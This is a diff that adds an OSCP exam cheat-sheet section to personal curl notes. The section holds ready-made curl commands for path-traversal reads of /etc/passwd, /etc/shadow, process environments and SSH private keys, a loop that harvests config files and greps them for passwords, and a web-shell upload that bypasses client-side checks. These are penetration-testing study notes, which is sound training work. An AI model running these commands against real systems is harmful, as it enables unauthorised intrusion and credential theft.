@@ -4,6 +4,56 @@ Understanding curl means understanding HTTP. Curl doesn't "use" a website — it
 
 ---
 
+## OSCP Essentials — Most-Used
+
+The handful of curl moves you actually reach for on the exam. Fuller explanations are in the sections further down.
+
+### Path Traversal / LFI file read
+```bash
+curl -s --path-as-is "http://<IP>/../../../../etc/passwd"
+```
+→ `--path-as-is` stops curl from collapsing `../` *before* sending — **required** for traversal, or the attack never reaches the server. High-value read targets:
+
+| Target | What you get |
+|---|---|
+| `/etc/passwd` | user enumeration (who has `/bin/bash`) |
+| `/proc/self/cmdline` | the web process's launch args — often creds (`-u user -p pass`). Pipe through `tr '\0' ' '` to read it |
+| `/proc/self/environ` | env-var secrets (DB creds, API keys) — try when `cmdline` has nothing |
+| `/etc/shadow` | password hashes (needs root-level read) |
+| `/home/<user>/.ssh/id_rsa` | reusable private keys |
+
+See [[LFI_RFI]].
+
+### Carve many files through one LFI (loop)
+```bash
+for i in $(cat tmp); do
+  curl -s -q --path-as-is "http://<IP>/path/../../etc/freeswitch/autoload_configs/$i" >> carve
+done
+grep -i password carve
+```
+→ `tmp` holds a list of candidate filenames (build it with `grep -Ril` — see [[Grep]]). The loop fetches each one through the traversal and **appends** (`>>`, not `>` which would overwrite) every response into a single file `carve`; then one grep finds the secret across all of them. **Why bother:** when a *live* config differs from a backup you already grabbed (the backup had only a default password), this re-pulls the real files.
+
+### Upload a shell past browser-side validation
+```bash
+curl -b "session=abc123" -F "file=@shell.php" http://<IP>/admin/upload
+```
+→ "Images only" checks usually run in JavaScript in the browser; curl sends straight to the server, which may not validate at all.
+
+### Download a file behind auth
+```bash
+curl -b "session=abc123" http://<IP>/admin/backup.zip -o backup.zip
+```
+→ Without the cookie you save the login page (302). Backups often hold source, config creds, old passwords.
+
+### Fingerprint / debug
+```bash
+curl -i http://<IP>/        # response headers (Server, X-Powered-By, Set-Cookie)
+curl -L http://<IP>/        # follow redirects
+curl -v http://<IP>/admin   # see the raw request (>) and response (<)
+```
+
+---
+
 ## How HTTP Requests Work
 
 Every interaction between a browser and a server is an HTTP request. There are four you'll use constantly:
